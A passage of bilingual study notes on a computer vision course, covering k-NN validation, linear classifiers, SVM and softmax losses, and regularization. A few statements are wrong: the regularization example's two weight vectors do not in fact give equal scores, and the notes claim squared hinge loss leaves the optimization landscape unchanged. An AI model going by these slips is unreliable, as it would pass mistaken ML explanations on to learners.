<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-cv-lec1-__codelineno-7-1"></a><span class="c1"># assume we have Xtr_rows, Ytr, Xte_rows, Yte as before</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-cv-lec1-__codelineno-7-2"></a><span class="c1"># recall Xtr_rows is 50,000 x 3072 matrix</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-cv-lec1-__codelineno-7-3"></a><span class="n">Xval_rows</span> <span class="o">=</span> <span class="n">Xtr_rows</span><span class="p">[:</span><span class="mi">1000</span><span class="p">,</span> <span class="p">:]</span> <span class="c1"># take first 1000 for validation</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-cv-lec1-__codelineno-7-4"></a><span class="n">Yval</span> <span class="o">=</span> <span class="n">Ytr</span><span class="p">[:</span><span class="mi">1000</span><span class="p">]</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-cs-cv-lec1-__codelineno-7-5"></a><span class="n">Xtr_rows</span> <span class="o">=</span> <span class="n">Xtr_rows</span><span class="p">[</span><span class="mi">1000</span><span class="p">:,</span> <span class="p">:]</span> <span class="c1"># keep last 49,000 for train</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-cs-cv-lec1-__codelineno-7-6"></a><span class="n">Ytr</span> <span class="o">=</span> <span class="n">Ytr</span><span class="p">[</span><span class="mi">1000</span><span class="p">:]</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#note-cs-cv-lec1-__codelineno-7-7"></a>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#note-cs-cv-lec1-__codelineno-7-8"></a><span class="c1"># find hyperparameters that work best on the validation set</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#note-cs-cv-lec1-__codelineno-7-9"></a><span class="n">validation_accuracies</span> <span class="o">=</span> <span class="p">[]</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#note-cs-cv-lec1-__codelineno-7-10"></a><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">100</span><span class="p">]:</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#note-cs-cv-lec1-__codelineno-7-11"></a>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#note-cs-cv-lec1-__codelineno-7-12"></a>  <span class="c1"># use a particular value of k and evaluation on validation data</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#note-cs-cv-lec1-__codelineno-7-13"></a>  <span class="n">nn</span> <span class="o">=</span> <span class="n">NearestNeighbor</span><span class="p">()</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#note-cs-cv-lec1-__codelineno-7-14"></a>  <span class="n">nn</span><span class="o">.</span><span class="n">train</span><span class="p">(</span><span class="n">Xtr_rows</span><span class="p">,</span> <span class="n">Ytr</span><span class="p">)</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#note-cs-cv-lec1-__codelineno-7-15"></a>  <span class="c1"># here we assume a modified NearestNeighbor class that can take a k as input</span>
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#note-cs-cv-lec1-__codelineno-7-16"></a>  <span class="n">Yval_predict</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xval_rows</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">k</span><span class="p">)</span>
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#note-cs-cv-lec1-__codelineno-7-17"></a>  <span class="n">acc</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">Yval_predict</span> <span class="o">==</span> <span class="n">Yval</span><span class="p">)</span>
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#note-cs-cv-lec1-__codelineno-7-18"></a>  <span class="nb">print</span> <span class="s1">&#39;accuracy: </span><span class="si">%f</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">acc</span><span class="p">,)</span>
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#note-cs-cv-lec1-__codelineno-7-19"></a>
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#note-cs-cv-lec1-__codelineno-7-20"></a>  <span class="c1"># keep track of what works on the validation set</span>
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#note-cs-cv-lec1-__codelineno-7-21"></a>  <span class="n">validation_accuracies</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">k</span><span class="p">,</span> <span class="n">acc</span><span class="p">))</span>
</span></code></pre></div></p>
<ul>
<li>Cross-validation: Split the data into folds, and average the performance across folds.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-10.png" width="80%">
</div>

<p>Useful for small datasets, but (unfortunately) not used too frequently in deep learning</p>
<h3 id="note-cs-cv-lec1-pros-and-cons-of-k-nn">Pros and Cons of K-NN<a class="headerlink" href="#note-cs-cv-lec1-pros-and-cons-of-k-nn" title="Permanent link">&para;</a></h3>
<ul>
<li>Pros: Simple to understand, fast to train, easy to add more data.</li>
<li>Cons: Slow to predict, not good for high-dimensional data, sensitive to irrelevant features.</li>
</ul>
<p>The Nearest Neighbor Classifier may sometimes be a good choice in some settings (especially if the data is low-dimensional), but it is rarely appropriate for use in practical image classification settings.</p>
<p>One problem is that images are high-dimensional objects (i.e. they often contain many pixels), and distances over high-dimensional spaces can be very counter-intuitive. The image below illustrates the point that the pixel-based L2 similarities we developed above are very different from perceptual similarities:</p>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-11.png" width="80%">
</div>
<blockquote>
<p>高维数据（尤其是图像）的基于像素的距离可能非常不直观。已张原始图像（左）和旁边的其他三张图像，根据 L2 像素距离，它们都与它相距相等。显然，像素距离根本不对应于感知或语义相似性。</p>
</blockquote>
<p>One more Example：</p>
<p>可以使用一种称为 t-SNE 的可视化技术来获取 CIFAR-10 图像并将它们嵌入到二维空间中，以便最好地保留它们的（局部）成对距离。在此可视化中，根据我们上面的 L2 像素距离，附近显示的图像被视为非常近：</p>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-12.png" width="80%">
</div>
<blockquote>
<p>CIFAR-10 images embedded in two dimensions with t-SNE. Images that are nearby on this image are considered to be close based on the L2 pixel distance. Notice the strong effect of background rather than semantic class differences. Click <a href="https://cs231n.github.io/assets/pixels_embed_cifar10_big.jpg">here</a> for a bigger version of this visualization.</p>
</blockquote>
<p>在以上的方法中，训练时间很短，但是预测时间很长，因为每次预测都需要计算所有的训练数据。而在实际应用中，我们期望的是即使训练时间长，也要预测时间短的模型。</p></section><section class="print-page" id="note-cs-cv-lec2" heading-number="2.4.5.3"><h1 id="note-cs-cv-lec2-linear-classifier">linear classifier<a class="headerlink" href="#note-cs-cv-lec2-linear-classifier" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2530 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 6 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 10 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<h2 id="note-cs-cv-lec2-format-of-the-score-function">Format of the score function<a class="headerlink" href="#note-cs-cv-lec2-format-of-the-score-function" title="Permanent link">&para;</a></h2>
<p>Define a score function <span class="arithmatex">\(f: \mathbb{R}^D \rightarrow \mathbb{R}^K\)</span>:</p>
<div class="arithmatex">\[
    f(x_i, W, b) = Wx_i + b
\]</div>
<p>where <span class="arithmatex">\(W\)</span> is a matrix of weights of size <span class="arithmatex">\(K \times D\)</span> and <span class="arithmatex">\(b\)</span> is a vector of biases of size <span class="arithmatex">\(K\)</span>.</p>
<p><span class="arithmatex">\(x_i\)</span> is the input data, a column vector of size <span class="arithmatex">\(D \times 1\)</span>,in our CIFAR-10 example, <span class="arithmatex">\(D = 32 \times 32 \times 3 = 3072\)</span>.</p>
<p>and <span class="arithmatex">\(f\)</span> is a function that maps the raw image pixels to class scores. output <span class="arithmatex">\(f(x_i, W, b)\)</span> is a vector of size <span class="arithmatex">\(K \times 1\)</span>.<span class="arithmatex">\(K\)</span> is the number of classes.In our CIFAR-10 example, <span class="arithmatex">\(K = 10\)</span>.</p>
<ul>
<li>
<p>ote that the single matrix multiplication <span class="arithmatex">\(Wx_i\)</span> is effectively evaluating 10 separate classifiers in parallel (one for each class), where each classifier is a row of <span class="arithmatex">\(W\)</span>.</p>
</li>
<li>
<p>Notice also that we think of the input data <span class="arithmatex">\((x_i,y_i)\)</span>
 as given and fixed, but we have control over the setting of the parameters <span class="arithmatex">\(W,b\)</span>. Our goal will be to set these in such way that the computed scores match the ground truth labels across the whole training set.  we wish that the correct class has a score that is higher than the scores of incorrect classes.</p>
</li>
<li>
<p>An advantage of this approach is that the training data is used to learn the parameters W,b, but once the learning is complete we can discard the entire training set and only keep the learned parameters. That is because a new test image can be simply forwarded through the function and classified based on the computed scores.</p>
</li>
</ul>
<p>An according to the linearity of the score function，if we ignore the bias term <span class="arithmatex">\(b\)</span>:</p>
<div class="arithmatex">\[
    f(cx,W)=W(cx)=cWx=cf(x,W)
\]</div>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-0.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<h2 id="note-cs-cv-lec2-explanaition">Explanaition<a class="headerlink" href="#note-cs-cv-lec2-explanaition" title="Permanent link">&para;</a></h2>
<p>For example, for a single pixel, which has three channels, the weight matrix is <span class="arithmatex">\(K \times 3\)</span>, and each of the three positions in a row can be used to represent the class "dislike or like" a certain color by setting the weight positive or negative. For example, for a ship, the blue weight may be larger, while for a plane, the red weight may be larger.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-1.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<blockquote>
<p>An example of mapping an image to class scores. For the sake of visualization, we assume the image only has 4 pixels (4 monochrome pixels, we are not considering color channels in this example for brevity), and that we have 3 classes (red (cat), green (dog), blue (ship) class). (Clarification: in particular, the colors here simply indicate 3 classes and are not related to the RGB channels.) We stretch the image pixels into a column and perform matrix multiplication to get the scores for each class. Note that this particular set of weights W is not good at all: the weights assign our cat image a very low cat score. In particular, this set of weights seems convinced that it's looking at a dog.</p>
</blockquote>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>对于上面所示的例子，我们也可以将偏移量接到<span class="arithmatex">\(W\)</span>的最后一列，这样只需要将输入数据的最后一行设置为1，就可以将偏移量视为权重的一部分。</p>
</div>
<h3 id="note-cs-cv-lec2-hyperplane">Hyperplane<a class="headerlink" href="#note-cs-cv-lec2-hyperplane" title="Permanent link">&para;</a></h3>
<p>Assume that each images(represented by a column vector) is a point in a <span class="arithmatex">\(D\)</span>-dimensional space, and the hole dataset is a set of points in that space. The score function <span class="arithmatex">\(f(x_i, W, b)\)</span> is a linear function of the input data <span class="arithmatex">\(x_i\)</span>, which means that the classes are separated by linear hyperplanes.</p>
<p>We cannot visualize 3072-dimensional spaces, but if we imagine squashing all those dimensions into only two dimensions, then we can try to visualize what the classifier might be doing:</p>
<p>using <em>Hyperplane</em> to separate the classes into different regions.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-2.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<blockquote>
<p>Cartoon representation of the image space, where each image is a single point, and three classifiers are visualized. Using the example of the car classifier (in red), the red line shows all points in the space that get a score of zero for the car class. The red arrow shows the direction of increase, so all points to the right of the red line have positive (and linearly increasing) scores, and all points to the left have a negative (and linearly decreasing) scores.</p>
</blockquote>
<p>As we saw above, every row of <span class="arithmatex">\(W\)</span> is a classifier for one of the classes. The geometric interpretation of these numbers is that as we change one of the rows of <span class="arithmatex">\(W\)</span>, the corresponding line in the pixel space will rotate in different directions. The biases <span class="arithmatex">\(b\)</span>
, on the other hand, allow our classifiers to translate the lines. In particular, note that without the bias terms, plugging in <span class="arithmatex">\(x_i=0\)</span>
would always give score of zero regardless of the weights, so all lines would be forced to cross the origin.</p>
<p>偏移量的存在使得我们的分类器可以在空间中平移，而不仅仅是旋转。</p>
<p>But sometimes it is hard to find a hyperplane to separate the classes:</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-4.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<p>and that is the reason whyb Perceptron couldn’t learn XOR function.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-5.png" width="500" />

<figcaption>XOR</figcaption>
</figure>
<p>We cannot separate the "Blue" and "Green" classes with a single line.</p>
<h3 id="note-cs-cv-lec2-template">template<a class="headerlink" href="#note-cs-cv-lec2-template" title="Permanent link">&para;</a></h3>
<p>If we think of the weights as a template for each of the classes:</p>
<p><em>At first we represent each image into a column vector,we can also represent each column vector in the weight matrix as a template for each class.Just like the figure below.</em></p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-3.png" />

<figcaption>Example</figcaption>
</figure>
<p>then the score function is computing how well each template matches the image. The score for each class is obtained</p>
<p>Here we calculate the inner product as</p>
<div class="arithmatex">\[
   \mathbf{A} \cdot \mathbf{B} = \sum_{i=1}^{n} a_{ij}b_{ij}
\]</div>
<p>因为之前就是按照一行乘一列来计算内积，这里只不过是更改了表示方式，所以计算方式是对应位置相乘再相加，而不是矩阵乘法，这就是上面的图中的计算方式。</p>
<div class="admonition note">
<p class="admonition-title">图像预处理</p>
<p>在实际应用中，通常会对图像进行预处理，例如减去均值，除以方差等，例如从图像中减去均值图像，将像素值从[0，255]变成大概是[-127，127]，然后进一步处理变成[-1，1]等……</p>
</div>
<h2 id="note-cs-cv-lec2-loss-function">Loss function<a class="headerlink" href="#note-cs-cv-lec2-loss-function" title="Permanent link">&para;</a></h2>
<p>We are going to measure our unhappiness with outcomes with a <strong>loss function</strong> (or sometimes also referred to as the <strong>cost function</strong> or the <strong>objective</strong>). Intuitively, the loss will be high if we’re doing a poor job of classifying the training data, and it will be low if we’re doing well.</p>
<h3 id="note-cs-cv-lec2-multiclass-support-vector-machine-loss">Multiclass Support Vector Machine loss<a class="headerlink" href="#note-cs-cv-lec2-multiclass-support-vector-machine-loss" title="Permanent link">&para;</a></h3>
<p>The Multiclass Support Vector Machine(SVM) loss is set up so that the SVM “wants” the correct class for each image to have a score higher than the incorrect classes by some fixed margin <span class="arithmatex">\(\Delta\)</span>.</p>
<p>It looks for certain outcome in the sence that the outcome will yield a lower loss.</p>
<p>The loss function for the <span class="arithmatex">\(i\)</span>-th example is:</p>
<div class="arithmatex">\[
    L_i = \sum_{j \neq y_i} \max(0, s_j - s_{y_i} + \Delta)
\]</div>
<p>where <span class="arithmatex">\(s_{y_i}\)</span> is the score of the correct class(<span class="arithmatex">\(f(x_i,W)\)</span>) and <span class="arithmatex">\(s_j\)</span> is the score of the j-th class(<span class="arithmatex">\(f(x_i,W)\)</span>).</p>
<p>For example,if <span class="arithmatex">\(\Delta = 1\)</span>,and the score of the correct class is 13,then any score below 12 will contribute 0 to the loss.Any score above 12 will contribute to the loss.</p>
<h4 id="note-cs-cv-lec2-hinge-loss">Hinge loss<a class="headerlink" href="#note-cs-cv-lec2-hinge-loss" title="Permanent link">&para;</a></h4>
<p>The  threshold at zero <span class="arithmatex">\(max(0,-)\)</span> function is called the <strong>hinge loss</strong>. It is a piecewise linear function that behaves like the following:</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-7.png" width="500" />

<figcaption>Hinge loss</figcaption>
</figure>
<blockquote>
<p>The Multiclass Support Vector Machine "wants" the score of the correct class to be higher than all other scores by at least a margin of delta. If any class has a score inside the red region (or higher), then there will be accumulated loss. Otherwise the loss will be zero. Our objective will be to find the weights that will simultaneously satisfy this constraint for all examples in the training data and give a total loss that is as low as possible.</p>
</blockquote>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec2-6.png" width="500" />
<figcaption>Example</figcaption>
</figure></p>
<p>Here shows the score of three classes for each input image(cat,car.frog)</p>
<p>Assume <span class="arithmatex">\(\Delta=1\)</span> the loss for the cat input image is:</p>
<p>Neglect the score of the correct class(cat),the loss <span class="arithmatex">\(L_1\)</span> is:</p>
<div class="arithmatex">\[
max(0,5.1-3.2+1)+max(0.-1.7-3.2+1)=2.9
\]</div>
<p>Similarly, the loss for the car input image is:</p>
<div class="arithmatex">\[
    max(0, 1.3 -4.9 + 1)+max(0, 2.0 -4.9 + 1)=0
\]</div>
<p>The loss for the frog input image is:</p>
<div class="arithmatex">\[
    max(0, 2.2 - (-3.1) + 1)+max(0, 2.5 - (-3.1) + 1)=12.9
\]</div>
<p>This claims that the weight matrix acts good on the car image, but not such good the cat, bad on the frog.</p>
<p>Finaly the total loss on the data set is the average of all the losses:</p>
<div class="arithmatex">\[
    L = \frac{1}{N} \sum_{i=1}^{N} L_i =\dfrac{2.9+0+12.9}{3}=5.27
\]</div>
</div>
<div class="admonition question">
<p class="admonition-title">Question</p>
<ul>
<li>
<p>Q:  What happens to the loss if the scores for the car image change a bit</p>
</li>
<li>
<p>A: Once the score for car image is 0,it will not change at all if the score for the cat image changes a bit.</p>
</li>
<li>
<p>Q:  What are the min and max possible loss?</p>
</li>
<li>
<p>A: The min loss is 0, and the max loss is <span class="arithmatex">\(\infty\)</span>.</p>
</li>
<li>
<p>Q:  If all the scores were random, what loss would we expect</p>
</li>
<li>
<p>A: The total loss would be <span class="arithmatex">\(K-1\)</span>, where <span class="arithmatex">\(K\)</span> is the number of classes.<strong>This is because if all the scores are random,it can be regard as a Gauss distribution, <span class="arithmatex">\(s_i\)</span> and <span class="arithmatex">\(s_j\)</span> will be close to each other, so the loss will be near to <span class="arithmatex">\(1\)</span></strong>,so it will be <span class="arithmatex">\(K-1\)</span> for each class</p>
</li>
<li>
<p>Q: What would happen if the sum were over all classes? (including the correct class)</p>
</li>
<li>
<p>A: All of loss will add 1.</p>
</li>
<li>
<p>Q:What if the loss used a mean instead of a sum</p>
</li>
<li>
<p>A: It still works, since dividing by a constant doesn't change the optimization landscape.</p>
</li>
<li>
<p>Q: What if we used this loss instead?</p>
</li>
</ul>
<div class="arithmatex">\[
    L_i = \sum_{j \neq y_i} \max(0, s_j - s_{y_i} + \Delta)^2
\]</div>
<ul>
<li>A: It still works, since squaring doesn't change the optimization landscape.But it changes the preference of the model.</li>
</ul>
</div>
<h2 id="note-cs-cv-lec2-softmax-classifier">Softmax classifier<a class="headerlink" href="#note-cs-cv-lec2-softmax-classifier" title="Permanent link">&para;</a></h2>
<p>Another common loss function is the <strong>Softmax classifdier</strong>. It has the form:</p>
<div class="arithmatex">\[
    L_i = -\log\left(\frac{e^{s_{y_i}}}{\sum_{j} e^{s_j}}\right)
\]</div>
<p>or</p>
<div class="arithmatex">\[
    P(Y=y_i|X=x_i) = \dfrac{e^{s_{y_i}}}{\sum_{j} e^{s_j}}
\]</div>
<div class="arithmatex">\[
    L_i = -\log P(Y=y_i|X=x_i)
\]</div>
<p>the function <span class="arithmatex">\(f_j(z)=\dfrac{e^{z_j}}{\sum_{k} e^{z_k}}\)</span> is called the <strong>softmax function</strong>. It takes a vector of arbitrary real-valued scores (in <span class="arithmatex">\(z\)</span>) and squashes it to a vector of values between zero and one that sum to one.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-8.png" width="500" />

<figcaption>Softmax</figcaption>
</figure>
<blockquote>
<p>应用这个函数将原始的分数转换为概率;期望的情况是，正确的类别的概率应该接近1，而错误的类别的概率应该接近0。</p>
</blockquote>
<p>The cross-entropy between a “true” distribution <span class="arithmatex">\(p\)</span> and an estimated distribution <span class="arithmatex">\(q\)</span> is defined as:</p>
<div class="arithmatex">\[
    H(p,q) = -\sum_{x} p(x) \log q(x)
\]</div>
<p>The Softmax classifier is hence minimizing the cross-entropy between the estimated class probabilities(i.e. the output of the Softmax function)and the “true” distribution, which in this interpretation is the distribution where all probability mass is on the correct class (i.e. <span class="arithmatex">\(p=[0,0,...1,...,0]\)</span> contains a single 1 at the <span class="arithmatex">\(y_i\)</span>-th position).</p>
<p>and since the cross-entropy can be written in terms of entropy and the Kullback-Leibler divergence as <span class="arithmatex">\(H(p,q) = H(p) + D_{KL}(p||q)\)</span>, we see that the Softmax classifier is exactly minimizing the KL divergence between the estimated class probabilities and the true distribution.</p>
<p>i.e the cross-entropy objective wants the predicted distribution to have all of its mass on the correct answer.</p>
<p>When using softmax classifier, because of:</p>
<div class="arithmatex">\[
    \dfrac{e^{s_{y_i}}}{\sum_{j} e^{s_j}} = \dfrac{Ce^{s_{y_i}}}{C\sum_{j} e^{s_j}}=\dfrac{e^{s_{y_i}+logC}}{\sum_{j} e^{s_j+logC}}
\]</div>
<p>We are free to choose the value of <span class="arithmatex">\(C\)</span>. This will not change any of the results, but we can use this value to improve the numerical stability of the computation. A common choice for <span class="arithmatex">\(C\)</span> is to set <span class="arithmatex">\(\logC=−max_jf_j\)</span>. This simply states that we should shift the values inside the vector <span class="arithmatex">\(f\)</span> so that the highest value is zero. In code:</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec2-__codelineno-0-1"></a><span class="n">f</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([</span><span class="mi">123</span><span class="p">,</span> <span class="mi">456</span><span class="p">,</span> <span class="mi">789</span><span class="p">])</span> <span class="c1"># example with 3 classes and each having large scores</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec2-__codelineno-0-2"></a><span class="n">p</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">exp</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">/</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">exp</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="c1"># Bad: Numeric problem, potential blowup</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec2-__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-cv-lec2-__codelineno-0-4"></a><span class="c1"># instead: first shift the values of f so that the highest number is 0:</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-cv-lec2-__codelineno-0-5"></a><span class="n">f</span> <span class="o">-=</span> <span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="c1"># f becomes [-666, -333, 0]</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-cv-lec2-__codelineno-0-6"></a><span class="n">p</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">exp</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">/</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">exp</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="c1"># safe to do, gives the correct answer</span>
</span></code></pre></div>
<div class="admonition question">
<p class="admonition-title">Question</p>
<ul>
<li>Q: what is the min and max possible loss?</li>
<li>
<p>A: The min loss is 0, and the max loss is <span class="arithmatex">\(\infty\)</span>.But the two bounds could never be reached.</p>
</li>
<li>
<p>Q: What is the difference between the SVM loss and the Softmax loss?</p>
</li>
<li>
<p>A: The SVM loss is a hinge loss, while the Softmax loss is a cross-entropy loss. The SVM loss is a bit more robust to outliers, while the Softmax loss is more informative and can drive the model to be more confident in its predictions.</p>
</li>
</ul>
</div>
<h2 id="note-cs-cv-lec2-regularization">Regularization<a class="headerlink" href="#note-cs-cv-lec2-regularization" title="Permanent link">&para;</a></h2>
<p>In practice, we also add a regularization term to the loss function to prevent overfitting. The most common regularization is the L2 regularization, which has the form:</p>
<div class="arithmatex">\[
    R(W) = \sum_{k} \sum_{l} W_{k,l}^2
\]</div>
<p>or L1 regularization:</p>
<div class="arithmatex">\[
    R(W) = \sum_{k} \sum_{l} |W_{k,l}|
\]</div>
<p>or Elastic Net regularization:</p>
<div class="arithmatex">\[
    R(W) = \sum_{k} \sum_{l} \alpha W_{k,l}^2 + (1-\alpha)|W_{k,l}|
\]</div>
<p>We add the regularization term to the loss function in order to prevent overfitting. The regularization strength <span class="arithmatex">\(\lambda\)</span> is a hyperparameter that we tune using the validation set.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec2-9.png" width="500" />

<figcaption>Overfititng</figcaption>
</figure>
<blockquote>
<p>Overfitting is a common problem in machine learning, where a model performs well on the training data but poorly on the test data. Regularization is a technique used to prevent overfitting by adding a penalty term to the loss function that discourages large weights.</p>
</blockquote>
<p>so the final loss function is:</p>
<div class="arithmatex">\[
    L = \dfrac{1}{N} \sum_{i} L_i + \lambda R(W)
\]</div>
<p>where <span class="arithmatex">\(N\)</span> is the number of training examples, <span class="arithmatex">\(L_i\)</span> is the loss for the <span class="arithmatex">\(i\)</span>-th example, and <span class="arithmatex">\(R(W)\)</span> is the regularization term.</p>
<p>It also help us to choose different weight matrix when there are multiple solutions that causes the same loss.</p>
<p>Such as the following example:</p>
<p>image: [1.0, 1.0, 1.0]</p>
<p><span class="arithmatex">\(W_1\)</span>: [1.0, 0.0, 0.0]</p>
<p><span class="arithmatex">\(W_2\)</span>: [0.25,0.25, 0.25]</p>
<p>the score of the two weight matrix is the same, but if we use L2 regularization, the <span class="arithmatex">\(W_1\)</span> will cause higher loss than <span class="arithmatex">\(W_2\)</span>. So we will choose <span class="arithmatex">\(W_2\)</span>.</p></section><section class="print-page" id="note-cs-cv-lec3" heading-number="2.4.5.4"><h1 id="note-cs-cv-lec3-optimization">Optimization<a class="headerlink" href="#note-cs-cv-lec3-optimization" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
